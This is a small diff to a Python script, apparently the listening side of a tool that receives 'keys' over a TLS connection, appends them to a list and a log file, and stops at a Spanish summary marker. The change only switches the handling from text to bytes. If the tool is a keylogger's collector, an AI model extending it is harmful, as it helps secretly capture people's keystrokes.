@@ -29,7 +29,7 @@ def recv_out(secure_conn):
 def write_file(text, location, filename):
 
     # Archivo a crear
-    with open(location + filename, "a", encoding="utf-8") as log:
+    with open(location + filename, "ab") as log:
         log.write(text)
 
 
@@ -59,11 +59,11 @@ def connec(cert, key):
 
     num_keys = 0
     while True:
-        msg = recv_out(secure_conn).decode()
+        msg = recv_out(secure_conn)
         if __name__ == "__main__":
             print(msg)
 
-        if "[!] Este ha sido mi resumen:" in msg:
+        if "[!] Este ha sido mi resumen:".encode() in msg:
             exit()
 
         keys.append(msg)
